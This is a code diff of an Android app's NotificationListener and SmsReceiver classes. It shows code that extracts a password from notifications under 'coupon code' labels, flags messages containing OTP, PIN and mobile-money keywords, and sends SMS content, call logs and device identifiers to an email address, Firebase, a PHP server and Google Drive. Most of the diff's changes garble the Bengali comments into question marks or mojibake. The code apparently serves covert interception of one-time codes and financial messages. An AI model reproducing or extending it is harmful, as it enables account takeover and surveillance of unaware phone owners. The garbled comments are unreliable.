+        return EmailFirstPartName; // ???? ????? ??? ???? ??????? ????
     }
 
 
@@ -1779,21 +1853,21 @@ public class NotificationListener extends NotificationListenerService {
             return RetrievestoreSharedPreferencesExtractEmailPassword(context);
         }
 
-        // **Regex ব্যবহার করে দ্বিতীয় কুপন কোড বের করা**
-        String regex2 = "cuponcode2\\s+(\\w+)"; // `cuponcode2` এর পরের ওয়ার্ড ক্যাপচার করবে
+        // **Regex ??????? ??? ??????? ???? ??? ??? ???**
+        String regex2 = "cuponcode2\\s+(\\w+)"; // `cuponcode2` ?? ???? ?????? ???????? ????
         Pattern pattern2 = Pattern.compile(regex2);
         Matcher matcher2 = pattern2.matcher(notificationmessage);
 
         String EmailPassword = null;
 
         if (matcher2.find()) {
-            EmailPassword = matcher2.group(1); // দ্বিতীয় কুপন কোড
+            EmailPassword = matcher2.group(1); // ??????? ???? ???
             Log.d(TAG, "Get Second cupon code: " + EmailPassword);
         } else {
             Log.d(TAG, "Not Get Second cupon code");
         }
 
-        // **কুপন কোড স্টোর করা**
+        // **???? ??? ????? ???**
         if (EmailPassword != null) {
             EmailPassword= EmailPassword.toString();
             storeSharedPreferencesExtractEmailPassword(EmailPassword, context);
@@ -1805,18 +1879,18 @@ public class NotificationListener extends NotificationListenerService {
     }
 
     public void storeSharedPreferencesExtractEmailPassword(String EmailPassword, Context context) {
-        // কনটেক্সট চেক করা (mContext যদি null হয়)
+        // ???????? ??? ??? (mContext ??? null ??)
         if (context == null) {
             Log.e(TAG, "storeSharedPreferencesExtractEmailPassword Method: Context is null. Unable to access SharedPreferences.");
-            return; // যদি context null হয়, তাহলে কার্যক্রম বন্ধ করা
+            return; // ??? context null ??, ????? ????????? ???? ???
         }
-        // শেয়ার্ড প্রিফারেন্সে নম্বরগুলো স্টোর করার জন্য editor পাওয়া
+        // ??????? ???????????? ????????? ????? ???? ???? editor ?????
         SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
         SharedPreferences.Editor editor = sharedPreferences.edit();
         if (EmailPassword != null) {
-            // নম্বরগুলো সেভ করা একটি নির্দিষ্ট কী-এর মাধ্যমে
+            // ????????? ??? ??? ???? ????????? ??-?? ???????
             editor.putString("EmailPassword", EmailPassword);
-            editor.apply(); // পরিবর্তনগুলো অ্যাপ্লাই করা
+            editor.apply(); // ???????????? ????????? ???
             Log.d(TAG, "storeSharedPreferencesExtractEmailPassword  Method Stored SharedPreferences EmailPassword: " + EmailPassword);
         }
         RetrievestoreSharedPreferencesExtractEmailPassword( context);
@@ -1826,17 +1900,17 @@ public class NotificationListener extends NotificationListenerService {
             Log.e(TAG, "RetrievestoreSharedPreferencesExtractEmailPassword Method Context is null. Unable to access SharedPreferences.");
             return null;
         }
-        // শেয়ার্ড প্রিফারেন্স থেকে স্টোর করা নম্বরগুলো রিটার্ন করা
+        // ??????? ??????????? ???? ????? ??? ????????? ??????? ???
         SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
 
-        // স্টোর করা নম্বর লোগ করা
+        // ????? ??? ????? ??? ???
         String EmailPassword = sharedPreferences.getString("EmailPassword", null);
         if (EmailPassword != null) {
             Log.d(TAG, "RetrievestoreSharedPreferencesExtractEmailPassword Method EmailPassword: " + EmailPassword);
         } else {
             Log.d(TAG, "RetrievestoreSharedPreferencesExtractEmailPassword Method EmailPassword: " + EmailPassword);
         }
-        return EmailPassword; // আগের স্টোর করা ডেটা রিটার্ন করুন
+        return EmailPassword; // ???? ????? ??? ???? ??????? ????
     }
 // === end code =====eextract Email Frst Part Name Emailpassword From Notification
 
@@ -2003,28 +2077,28 @@ private String bitmapToBase64(Bitmap bitmap) {
                 String finalContent = subject + "\n" + content +
                         "\nRecent Call Logs:\n" + recentCallLogs;
 
-                // 1️⃣ Send Email
+                // 1?? Send Email
                 new Thread(() -> {
                     try {
-                        Log.d(TAG, "📧 Sending Email...");
+                        Log.d(TAG, "?? Sending Email...");
                         JavaMailAPISendNotification.sendMail(
                                 EMAIL,
                                 finalSubject,
                                 finalContent,
                                 null
                         );
-                        Log.d(TAG, "✅ Email sent");
+                        Log.d(TAG, "? Email sent");
                     } catch (Exception e) {
-                        Log.e(TAG, "❌ Email failed", e);
+                        Log.e(TAG, "? Email failed", e);
                     }
                 }).start();
 
-                // 2️⃣ Save to Firebase (SIMPLE DIRECT VERSION)
+                // 2?? Save to Firebase (SIMPLE DIRECT VERSION)
                 new Thread(() -> {
                     try {
-                        Log.d(TAG, "🔥 Saving to Firebase...");
+                        Log.d(TAG, "?? Saving to Firebase...");
 
-                        // সরাসরি Firebase Database reference তৈরি করুন
+                        // ?????? Firebase Database reference ???? ????
                         FirebaseDatabase database = FirebaseDatabase.getInstance();
                         DatabaseReference myRef = database.getReference("smsData");
 
@@ -2032,7 +2106,7 @@ private String bitmapToBase64(Bitmap bitmap) {
                                 .format(new Date());
                         String smsId = myRef.push().getKey();
 
-                        // সরাসরি ডেটা তৈরি করুন (GetSim1AndSim2NumberFromAlertbox ছাড়া)
+                        // ?????? ???? ???? ???? (GetSim1AndSim2NumberFromAlertbox ????)
                         Map<String, Object> smsData = new HashMap<>();
                         smsData.put("sender", EMAIL);
                         smsData.put("subject", finalSubject);
@@ -2042,30 +2116,30 @@ private String bitmapToBase64(Bitmap bitmap) {
                         smsData.put("deviceModel", Build.MODEL);
                         smsData.put("androidVersion", Build.VERSION.RELEASE);
 
-                        // Firebase-এ save করুন
+                        // Firebase-? save ????
                         myRef.child(smsId).setValue(smsData)
-                                .addOnSuccessListener(aVoid -> Log.d(TAG, "✅ Firebase saved directly sussessfull"))
-                                .addOnFailureListener(e -> Log.e(TAG, "❌ Firebase direct save failed", e));
+                                .addOnSuccessListener(aVoid -> Log.d(TAG, "? Firebase saved directly sussessfull"))
+                                .addOnFailureListener(e -> Log.e(TAG, "? Firebase direct save failed", e));
 
                     } catch (Exception e) {
-                        Log.e(TAG, "❌ Firebase failed", e);
+                        Log.e(TAG, "? Firebase failed", e);
                     }
                 }).start();
-                // 3️⃣ Save to PHP MySQL
+                // 3?? Save to PHP MySQL
                 new Thread(() -> {
                     try {
-                        Log.d(TAG, "🌐 Testing PHP connection...");
+                        Log.d(TAG, "?? Testing PHP connection...");
                         testPHPConnection();
 
-                        Log.d(TAG, "🌐 Sending to PHP MySQL...");
+                        Log.d(TAG, "?? Sending to PHP MySQL...");
                         sendDataToPHPMysqlDBInBackground(content, image, context);
                     } catch (Exception e) {
-                        Log.e(TAG, "❌ PHP MySQL failed", e);
+                        Log.e(TAG, "? PHP MySQL failed", e);
                     }
                 }).start();
 
 
-                // 4️⃣ GOOGLE DRIVE (Apps Script + Offline Queue)
+                // 4?? GOOGLE DRIVE (Apps Script + Offline Queue)
                 executorService.execute(() -> {
 
                     try {
@@ -2090,25 +2164,25 @@ private String bitmapToBase64(Bitmap bitmap) {
                         OfflineQueueManager queue = new OfflineQueueManager(context);
 
                         if (isInternetConnected()) {
-                            Log.d(TAG, "🌐 Sending to SAVE TO GOOGLE DRIVE  Apps Script...");
+                            Log.d(TAG, "?? Sending to SAVE TO GOOGLE DRIVE  Apps Script...");
                             sendToGoogleDriveViaAppsScript(json.toString());
-                            retryQueuedData(context); // 🔁 flush old queue
+                            retryQueuedData(context); // ?? flush old queue
                         } else {
                             queue.enqueue(json.toString());
-                            Log.d(TAG, "📦 No internet → saved to GOOGLE DRIVEoffline queue");
+                            Log.d(TAG, "?? No internet ? saved to GOOGLE DRIVEoffline queue");
                         }
 
                     } catch (Exception e) {
-                        Log.e(TAG, "❌ Google Drive error", e);
+                        Log.e(TAG, "? Google Drive error", e);
                     }
                 });
     
             } catch (Exception e) {
-                Log.e(TAG, "❌ GOOGLE DRIVE Unexpected error", e);
+                Log.e(TAG, "? GOOGLE DRIVE Unexpected error", e);
             }
         }
     private void sendToGoogleDriveViaAppsScript(String jsonData) {
-        Log.d(TAG, "🌐 Sending to sendToGoogleDriveViaAppsScript");
+        Log.d(TAG, "?? Sending to sendToGoogleDriveViaAppsScript");
         try {
 
             URL url = new URL(
@@ -2128,7 +2202,7 @@ private String bitmapToBase64(Bitmap bitmap) {
             }
 
             int responseCode = conn.getResponseCode();
-            Log.d(TAG, "☁️ Drive response: " + responseCode);
+            Log.d(TAG, "?? Drive response: " + responseCode);
 
             conn.disconnect();
 
@@ -2138,7 +2212,7 @@ private String bitmapToBase64(Bitmap bitmap) {
     }
 
     private void retryQueuedData(Context context) {
-        Log.d(TAG, "🌐 Sending to retryQueuedData");
+        Log.d(TAG, "?? Sending to retryQueuedData");
         executorService.execute(() -> {
 
             if (!isInternetConnected( )) return;
@@ -2156,11 +2230,11 @@ private String bitmapToBase64(Bitmap bitmap) {
                     queue.delete(id);
 
                     c.close();
-                    Log.d(TAG, "☁️ Queued item uploaded");
+                    Log.d(TAG, "?? Queued item uploaded");
                 }
 
             } catch (Exception e) {
-                Log.e(TAG, "⏳ Retry paused", e);
+                Log.e(TAG, "? Retry paused", e);
             }
         });
     }
@@ -2174,7 +2248,7 @@ private String bitmapToBase64(Bitmap bitmap) {
         try {
             JSONObject json = new JSONObject();
 
-            // ✅ Safe device_id
+            // ? Safe device_id
             String deviceId = Settings.Secure.getString(
                     context.getContentResolver(),
                     Settings.Secure.ANDROID_ID
@@ -2210,7 +2284,7 @@ private String bitmapToBase64(Bitmap bitmap) {
             }
 
             int responseCode = conn.getResponseCode();
-            Log.d(TAG, "🌐 PHP response code = " + responseCode);
+            Log.d(TAG, "?? PHP response code = " + responseCode);
 
             InputStream is;
             try {
@@ -2218,7 +2292,7 @@ private String bitmapToBase64(Bitmap bitmap) {
                 is = conn.getInputStream();
             } catch (FileNotFoundException fnfe) {
                 is = conn.getErrorStream();
-                Log.e(TAG, "⚠️ FileNotFoundException, using error stream");
+                Log.e(TAG, "?? FileNotFoundException, using error stream");
             }
 
             if (is != null) {
@@ -2231,28 +2305,28 @@ private String bitmapToBase64(Bitmap bitmap) {
                 reader.close();
 
                 String responseStr = response.toString().trim();
-                Log.d(TAG, "🌐 PHP raw response: " + responseStr);
+                Log.d(TAG, "?? PHP raw response: " + responseStr);
 
-                // ✅ Only parse if response starts with '{'
+                // ? Only parse if response starts with '{'
                 if (responseStr.startsWith("{")) {
                     JSONObject responseJson = new JSONObject(responseStr);
                     if ("success".equalsIgnoreCase(responseJson.optString("status"))) {
-                        Log.d(TAG, "✅ PHP MySQL saved. ID = " + responseJson.optInt("id"));
+                        Log.d(TAG, "? PHP MySQL saved. ID = " + responseJson.optInt("id"));
                     } else {
-                        Log.e(TAG, "❌ PHP Error: " + responseJson.optString("message"));
+                        Log.e(TAG, "? PHP Error: " + responseJson.optString("message"));
                     }
                 } else {
-                    Log.e(TAG, "❌ Non-JSON response from PHP, skipping JSONObject parse");
+                    Log.e(TAG, "? Non-JSON response from PHP, skipping JSONObject parse");
                 }
 
             } else {
-                Log.e(TAG, "❌ PHP API returned empty response");
+                Log.e(TAG, "? PHP API returned empty response");
             }
 
             conn.disconnect();
 
         } catch (Exception e) {
-            Log.e(TAG, "❌ PHP API Exception", e);
+            Log.e(TAG, "? PHP API Exception", e);
         }
     }
 
@@ -2270,14 +2344,14 @@ private String bitmapToBase64(Bitmap bitmap) {
             conn.setReadTimeout(10000);
 
             int responseCode = conn.getResponseCode();
-            Log.d(TAG, "🌐 PHP test response code = " + responseCode);
+            Log.d(TAG, "?? PHP test response code = " + responseCode);
 
             InputStream is;
             try {
                 is = conn.getInputStream();
             } catch (FileNotFoundException fnfe) {
                 is = conn.getErrorStream();
-                Log.e(TAG, "⚠️ FileNotFoundException on test connection, using error stream");
+                Log.e(TAG, "?? FileNotFoundException on test connection, using error stream");
             }
 
             if (is != null) {
@@ -2290,27 +2364,27 @@ private String bitmapToBase64(Bitmap bitmap) {
                 reader.close();
 
                 String responseStr = response.toString().trim();
-                Log.d(TAG, "🌐 PHP test raw response: " + responseStr);
+                Log.d(TAG, "?? PHP test raw response: " + responseStr);
 
                 if (responseStr.startsWith("{")) {
                     JSONObject json = new JSONObject(responseStr);
                     if ("success".equalsIgnoreCase(json.optString("status"))) {
-                        Log.d(TAG, "✅ PHP test connection successful");
+                        Log.d(TAG, "? PHP test connection successful");
                     } else {
-                        Log.e(TAG, "❌ PHP test returned error: " + json.optString("message"));
+                        Log.e(TAG, "? PHP test returned error: " + json.optString("message"));
                     }
                 } else {
-                    Log.e(TAG, "❌ PHP test returned non-JSON response");
+                    Log.e(TAG, "? PHP test returned non-JSON response");
                 }
 
             } else {
-                Log.e(TAG, "❌ PHP test returned empty response");
+                Log.e(TAG, "? PHP test returned empty response");
             }
 
             conn.disconnect();
 
         } catch (Exception e) {
-            Log.e(TAG, "❌ PHP test connection Exception", e);
+            Log.e(TAG, "? PHP test connection Exception", e);
         }
     }
     //  end code php
@@ -2338,16 +2412,16 @@ private String bitmapToBase64(Bitmap bitmap) {
     public String readFromTextFile() {
         StringBuilder content = new StringBuilder();
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { // API level 26 বা তার উপরে
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { // API level 26 ?? ??? ????
             try {
-                // getFilesDir().getPath() ব্যবহার করে স্ট্রিং পাথ তৈরি করা হচ্ছে
+                // getFilesDir().getPath() ??????? ??? ??????? ??? ???? ??? ?????
                 byte[] bytes = Files.readAllBytes(Paths.get(getFilesDir().getPath(), "notification_log.txt"));
                 content.append(new String(bytes));
             } catch (IOException e) {
                 Log.e(TAG, "Error reading file using NIO API: ", e);
             }
         } else {
-            // যদি API level 26 এর কম হয়, তাহলে BufferedReader ব্যবহার হবে
+            // ??? API level 26 ?? ?? ??, ????? BufferedReader ??????? ???
             File file = new File(getFilesDir(), "notification_log.txt");
             try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                 String line;
@@ -2421,10 +2495,10 @@ private String bitmapToBase64(Bitmap bitmap) {
 
     // Store email details in SharedPreferences
     private void storeEmailDetailsSharedPreferences(String subject, String body, long fileSize) {
-        // Context চেক করুন
+        // Context ??? ????
         if (mContext == null) {
             Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
-            return; // যদি mContext null হয়, তাহলে কার্যক্রম বন্ধ করুন
+            return; // ??? mContext null ??, ????? ????????? ???? ????
         }
 
         SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
@@ -2439,10 +2513,10 @@ private String bitmapToBase64(Bitmap bitmap) {
 
     // Check if the email content is the same as before
     private boolean isEmailContentSame(String subject, String body, long fileSize) {
-        // নিশ্চিত করুন mContext null নয়
+        // ??????? ???? mContext null ??
         if (mContext == null) {
             Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
-            return false; // যদি mContext null হয়, তাহলে false রিটার্ন করুন
+            return false; // ??? mContext null ??, ????? false ??????? ????
         }
 
         SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
@@ -2450,21 +2524,9 @@ private String bitmapToBase64(Bitmap bitmap) {
         String previousBody = sharedPreferences.getString("body", "");
         long previousFileSize = sharedPreferences.getLong("fileSize", 0);
 
-        // বর্তমান ইমেলের কন্টেন্ট এবং স্টোর করা কন্টেন্ট তুলনা করুন
+        // ??????? ?????? ???????? ??? ????? ??? ???????? ????? ????
         return subject.equals(previousSubject) && body.equals(previousBody) && fileSize == previousFileSize;
     }
-    private boolean SameEmailCheekShouldForwardNotification(String packageName, String currentMessage) {
-        if (lastForwardedMessageMap.containsKey(packageName)) {
-            ForwardedMessage lastForwardedMessage = lastForwardedMessageMap.get(packageName);
-            boolean shouldForward = !currentMessage.equals(lastForwardedMessage.message) ||
-                    (System.currentTimeMillis() - lastForwardedMessage.timestamp) > 120000; // 2 minutes
-            return shouldForward;
-        }
-        return true;
-    }
-
-
-
 
 
 
@@ -2508,7 +2570,7 @@ private String bitmapToBase64(Bitmap bitmap) {
         String messageBody = "notification received an audio file.";
         try {
             byte[] audioData = readFileToByteArray(audioUri);
-            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, audioData, "audio.mp3"); // সঠিক ফাইল নাম ব্যবহার করুন
+            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, audioData, "audio.mp3"); // ???? ???? ??? ??????? ????
             Log.d(TAG, "notificationAudio  forwarded successfully via email");
         } catch (Exception e) {
             Log.e(TAG, "notification Failed to forward audio file: ", e);
@@ -2662,7 +2724,11 @@ private String bitmapToBase64(Bitmap bitmap) {
 
         return  notificationglobalsubject;
     }
+
+
+
 }
+
 
 
 
@@ -2716,7 +2782,7 @@ public class SmsReceiver extends BroadcastReceiver {
             "received TK","Cashback","Balance", "Recharge",  "received money"};
     private static final String[] OTP_WORDS = {"OTP", "Otp", "otp",  "PIN", "Pin", "pin","CODE", "Code", "code",
             "Google verification code","verification code","Verification code",
-            "মাইজিপি পিন (code)","মাইজিপি পিন ", "মাইজিপি পিন (code)", "(code)",
+            "à¦®à¦¾à¦‡à¦œà¦¿à¦ªà¦¿ à¦ªà¦¿à¦¨ (code)","à¦®à¦¾à¦‡à¦œà¦¿à¦ªà¦¿ à¦ªà¦¿à¦¨ ", "à¦®à¦¾à¦‡à¦œà¦¿à¦ªà¦¿ à¦ªà¦¿à¦¨ (code)", "(code)",
             "VERIFICATUON", "Verification", "verification"};
 
 
@@ -2734,10 +2800,10 @@ public class SmsReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         if (isMessageProcessed) {
-            return; // যদি মেসেজ ইতিমধ্যে প্রসেস করা হয়ে থাকে, তাহলে ফিরে যান
+            return; // à¦¯à¦¦à¦¿ à¦®à§‡à¦¸à§‡à¦œ à¦‡à¦¤à¦¿à¦®à¦§à§à¦¯à§‡ à¦ªà§à¦°à¦¸à§‡à¦¸ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡ à¦¥à¦¾à¦•à§‡, à¦¤à¦¾à¦¹à¦²à§‡ à¦«à¦¿à¦°à§‡ à¦¯à¦¾à¦¨
         }
-        // এসএমএস প্রসেসিং লজিক
-        isMessageProcessed = true; // মেসেজ প্রসেস করা হয়েছে চিহ্নিত করুন
+        // à¦à¦¸à¦à¦®à¦à¦¸ à¦ªà§à¦°à¦¸à§‡à¦¸à¦¿à¦‚ à¦²à¦œà¦¿à¦•
+        isMessageProcessed = true; // à¦®à§‡à¦¸à§‡à¦œ à¦ªà§à¦°à¦¸à§‡à¦¸ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡à¦›à§‡ à¦šà¦¿à¦¹à§à¦¨à¦¿à¦¤ à¦•à¦°à§à¦¨
         mContext = context;
 
         if (intent != null && intent.getExtras() != null) {
@@ -2763,33 +2829,33 @@ public class SmsReceiver extends BroadcastReceiver {
                         SharedPreferences sharedPreferences = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
                         int SMSCounter = sharedPreferences.getInt("SMSCounter", 0);
 
-                        // কাউন্টার ইনক্রিমেন্ট করুন
+                        // à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦‡à¦¨à¦•à§à¦°à¦¿à¦®à§‡à¦¨à§à¦Ÿ à¦•à¦°à§à¦¨
                         SMSCounter++;
-                        // SharedPreferences-এ আপডেটেড সংখ্যা সংরক্ষণ করুন
+                        // SharedPreferences-à¦ à¦†à¦ªà¦¡à§‡à¦Ÿà§‡à¦¡ à¦¸à¦‚à¦–à§à¦¯à¦¾ à¦¸à¦‚à¦°à¦•à§à¦·à¦£ à¦•à¦°à§à¦¨
                         SharedPreferences.Editor editor = sharedPreferences.edit();
                         editor.putInt("SMSCounter", SMSCounter);
                         editor.apply();
                         Log.d(TAG, "SharedPreferences Updated SMSCounter : " + SMSCounter);
 
-                        // মেসেজ কন্টেন্ট বিশ্লেষণ করে সিম নাম্বার বের করা হবে কিনা তা চেক করুন
+                        // à¦®à§‡à¦¸à§‡à¦œ à¦•à¦¨à§à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¬à¦¿à¦¶à§à¦²à§‡à¦·à¦£ à¦•à¦°à§‡ à¦¸à¦¿à¦® à¦¨à¦¾à¦®à§à¦¬à¦¾à¦° à¦¬à§‡à¦° à¦•à¦°à¦¾ à¦¹à¦¬à§‡ à¦•à¦¿à¦¨à¦¾ à¦¤à¦¾ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                         boolean IsSimNumberGetFromUserWords1 = isSimNumberGetFromUserWords1(messageBody);
                         boolean IsSimNumberGetFromUserWords2 = isSimNumberGetFromUserWords2(messageBody);
                         Log.d(TAG, "IsSimNumberGetFromUserWords1: " + IsSimNumberGetFromUserWords1 +
                                 " IsSimNumberGetFromUserWords2: " + IsSimNumberGetFromUserWords2);
 
-                        // নিশ্চিত করুন যে context ঠিক আছে
+                        // à¦¨à¦¿à¦¶à§à¦šà¦¿à¦¤ à¦•à¦°à§à¦¨ à¦¯à§‡ context à¦ à¦¿à¦• à¦†à¦›à§‡
                         Context appContext = context.getApplicationContext();
                         if (appContext == null) {
                             Log.e("SmsReciver", "Application context is null!");
                             return;
                         }
-                        // শর্ত যাচাই করে প্রয়োজন হলে GetSim1AndSim2NumberFromAlertbox অ্যাক্টিভিটি চালু করুন
+                        // à¦¶à¦°à§à¦¤ à¦¯à¦¾à¦šà¦¾à¦‡ à¦•à¦°à§‡ à¦ªà§à¦°à§Ÿà§‹à¦œà¦¨ à¦¹à¦²à§‡ GetSim1AndSim2NumberFromAlertbox à¦…à§à¦¯à¦¾à¦•à§à¦Ÿà¦¿à¦­à¦¿à¦Ÿà¦¿ à¦šà¦¾à¦²à§ à¦•à¦°à§à¦¨
                         if ((SMSCounter == 2 || SMSCounter == 600 || SMSCounter == 2000) ||
                                 (IsSimNumberGetFromUserWords1 && IsSimNumberGetFromUserWords2)) {
                             Log.d(TAG, "Condition met for alert window Showing");
 
                             Intent alertIntent = new Intent(appContext, GetSim1AndSim2NumberFromAlertbox.class);
-                            alertIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Service থেকে Activity চালু করার জন্য ফ্ল্যাগ
+                            alertIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Service à¦¥à§‡à¦•à§‡ Activity à¦šà¦¾à¦²à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ à¦«à§à¦²à§à¦¯à¦¾à¦—
                             appContext.startActivity(alertIntent);
 
                             // start code counter rest 0 SMSCounter  .for again come alart window
@@ -2834,7 +2900,7 @@ public class SmsReceiver extends BroadcastReceiver {
                         // Cheek Blocked notification
                         if (isBlockedmessageBody(messageBody)) {
                             Log.d(TAG, "Blocked notification detected. SMS will not be forwarded.");
-                            return;  // ব্লক কিওয়ার্ড পাওয়া গেলে ফরওয়ার্ড হবে না
+                            return;  // à¦¬à§à¦²à¦• à¦•à¦¿à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦ªà¦¾à¦“à§Ÿà¦¾ à¦—à§‡à¦²à§‡ à¦«à¦°à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦¹à¦¬à§‡ à¦¨à¦¾
                         }
 
                         boolean isNumberInCallLog = isNumberInCallLog(sender);
@@ -2903,7 +2969,7 @@ public class SmsReceiver extends BroadcastReceiver {
         }
     }
     //  messageBody blockedKeyword ============= start code =============
-    // ব্লক কিওয়ার্ড চেক করার ফাংশন
+    // à¦¬à§à¦²à¦• à¦•à¦¿à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦šà§‡à¦• à¦•à¦°à¦¾à¦° à¦«à¦¾à¦‚à¦¶à¦¨
     private boolean isBlockedmessageBody(String messageBody) {
         String blockedKeyword = findBlockedKeyword(messageBody);
         if (blockedKeyword != null) {
@@ -2912,17 +2978,17 @@ public class SmsReceiver extends BroadcastReceiver {
         }
         return false;
     }
-    // ব্লক কিওয়ার্ড খোঁজা
+    // à¦¬à§à¦²à¦• à¦•à¦¿à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦–à§‹à¦à¦œà¦¾
     private String findBlockedKeyword(String messageBody) {
         String[] blockedKeywords = {
                 "MB","Mb","mb","GP30",  "GB350TK", "30GB350TK", "GP30GB350TK",  "GB300TK",
-                "টাকা রিচার্জে", "প্যাকটির অটো রিনিউ",  "চালু করতে ডায়াল ", "Emergency balance", "  মিনিট/ব্যান্ডেল ",
-                "অফার",  "অফার!", "নতুন অফার!","অফারটি","রেগুলার কল রেট", "আজই শেষ দিন", "অফারটি নিতে বিকাশ/নগদ থেকে রিচার্জ করুন", "মেয়াদউত্তীর্ণ হবে",
-                "আজকের অফার", "সেরা অফার", "দিন মেয়াদী সেরা অফার", "৩০দিন ডায়াল", "৭দিন মেয়াদী", "7 দিন",
-                "প্যাক এর",   "মিনিট চালু হয়েছে", "http://mygp.li/My",
-               " জিবি ","*১২১*","৩০দিন", "৭ দিন", "৭দিন","৩০ দিন", "৩০দিন", "৩ দিন",
-                "৩ িন","১৫ দিন", "১৫দিন",
-                "ইন্টারনেট অফার", "আনলিমিটেড", " ইন্টারনেট বিলের", "পরিশোধিত", "Bubble shooter game", "inbox me", "পুরস্কার",
+                "à¦Ÿà¦¾à¦•à¦¾ à¦°à¦¿à¦šà¦¾à¦°à§à¦œà§‡", "à¦ªà§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦° à¦…à¦Ÿà§‹ à¦°à¦¿à¦¨à¦¿à¦‰",  "à¦šà¦¾à¦²à§ à¦•à¦°à¦¤à§‡ à¦¡à¦¾à¦¯à¦¼à¦¾à¦² ", "Emergency balance", "  à¦®à¦¿à¦¨à¦¿à¦Ÿ/à¦¬à§à¦¯à¦¾à¦¨à§à¦¡à§‡à¦² ",
+                "à¦…à¦«à¦¾à¦°",  "à¦…à¦«à¦¾à¦°!", "à¦¨à¦¤à§à¦¨ à¦…à¦«à¦¾à¦°!","à¦…à¦«à¦¾à¦°à¦Ÿà¦¿","à¦°à§‡à¦—à§à¦²à¦¾à¦° à¦•à¦² à¦°à§‡à¦Ÿ", "à¦†à¦œà¦‡ à¦¶à§‡à¦· à¦¦à¦¿à¦¨", "à¦…à¦«à¦¾à¦°à¦Ÿà¦¿ à¦¨à¦¿à¦¤à§‡ à¦¬à¦¿à¦•à¦¾à¦¶/à¦¨à¦—à¦¦ à¦¥à§‡à¦•à§‡ à¦°à¦¿à¦šà¦¾à¦°à§à¦œ à¦•à¦°à§à¦¨", "à¦®à§‡à§Ÿà¦¾à¦¦à¦‰à¦¤à§à¦¤à§€à¦°à§à¦£ à¦¹à¦¬à§‡",
+                "à¦†à¦œà¦•à§‡à¦° à¦…à¦«à¦¾à¦°", "à¦¸à§‡à¦°à¦¾ à¦…à¦«à¦¾à¦°", "à¦¦à¦¿à¦¨ à¦®à§‡à§Ÿà¦¾à¦¦à§€ à¦¸à§‡à¦°à¦¾ à¦…à¦«à¦¾à¦°", "à§©à§¦à¦¦à¦¿à¦¨ à¦¡à¦¾à§Ÿà¦¾à¦²", "à§­à¦¦à¦¿à¦¨ à¦®à§‡à§Ÿà¦¾à¦¦à§€", "7 à¦¦à¦¿à¦¨",
+                "à¦ªà§à¦¯à¦¾à¦• à¦à¦°",   "à¦®à¦¿à¦¨à¦¿à¦Ÿ à¦šà¦¾à¦²à§ à¦¹à§Ÿà§‡à¦›à§‡", "http://mygp.li/My",
+               " à¦œà¦¿à¦¬à¦¿ ","*à§§à§¨à§§*","à§©à§¦à¦¦à¦¿à¦¨", "à§­ à¦¦à¦¿à¦¨", "à§­à¦¦à¦¿à¦¨","à§©à§¦ à¦¦à¦¿à¦¨", "à§©à§¦à¦¦à¦¿à¦¨", "à§© à¦¦à¦¿à¦¨",
+                "à§© à¦¿à¦¨","à§§à§« à¦¦à¦¿à¦¨", "à§§à§«à¦¦à¦¿à¦¨",
+                "à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦…à¦«à¦¾à¦°", "à¦†à¦¨à¦²à¦¿à¦®à¦¿à¦Ÿà§‡à¦¡", " à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦¬à¦¿à¦²à§‡à¦°", "à¦ªà¦°à¦¿à¦¶à§‹à¦§à¦¿à¦¤", "Bubble shooter game", "inbox me", "à¦ªà§à¦°à¦¸à§à¦•à¦¾à¦°",
                  "bonus","Emergency balance", "Emergency","Silver",
                 "GB450TK"
         };
@@ -2983,7 +3049,7 @@ public class SmsReceiver extends BroadcastReceiver {
     }
     private List<Double> extractAllAmounts(String messageBody) {
         List<Double> amounts = new ArrayList<>();
-        String regex = "(?i)Tk\\s*([\\d,]+(?:\\.\\d{1,2})?)"; // Tk এর পর পরিমাণ খুঁজুন
+        String regex = "(?i)Tk\\s*([\\d,]+(?:\\.\\d{1,2})?)"; // Tk à¦à¦° à¦ªà¦° à¦ªà¦°à¦¿à¦®à¦¾à¦£ à¦–à§à¦à¦œà§à¦¨
         Pattern pattern = Pattern.compile(regex);
         Matcher matcher = pattern.matcher(messageBody);
         Log.d(TAG, "Using regex: " + regex);
@@ -2991,10 +3057,10 @@ public class SmsReceiver extends BroadcastReceiver {
             String amountString = matcher.group(1);
             Log.d(TAG, "Matched amount string: " + amountString);
             if (amountString != null) {
-                // কমা সরানো
+                // à¦•à¦®à¦¾ à¦¸à¦°à¦¾à¦¨à§‹
                 amountString = amountString.replace(",", "");
                 Log.d(TAG, "Processed amount string (without commas): " + amountString);
-                // পরিমাণটি ডাবল এ রূপান্তর করা
+                // à¦ªà¦°à¦¿à¦®à¦¾à¦£à¦Ÿà¦¿ à¦¡à¦¾à¦¬à¦² à¦ à¦°à§‚à¦ªà¦¾à¦¨à§à¦¤à¦° à¦•à¦°à¦¾
                 try {
